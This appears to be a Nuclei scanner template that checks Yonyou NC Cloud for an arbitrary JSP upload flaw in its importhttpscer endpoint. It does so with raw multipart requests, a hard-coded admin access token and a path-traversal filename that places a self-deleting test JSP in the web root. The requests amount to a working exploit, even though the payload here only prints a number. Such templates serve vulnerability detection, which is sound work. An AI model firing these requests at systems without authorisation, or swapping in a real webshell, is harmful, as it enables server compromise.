id: yongyou-nc-importhttpscer-fileupload

info:
  name: yongyou-nc-importhttpscer-fileupload
  author: msk
  severity: high

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
        Content-Type: multipart/form-data; boundary={{boundary}}
        accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
        Connection: close

        --{{boundary}}
        Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/{{filename}}.jsp"
        
        <%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        --{{boundary}}--
      

      - |
        GET /{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info

      - |
        POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
        Content-Type: multipart/form-data; boundary={{boundary}}
        accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
        Connection: close

        --{{boundary}}
        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
        
        <%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        --{{boundary}}--

      - |
        GET /nccloud/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
        
    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"12321")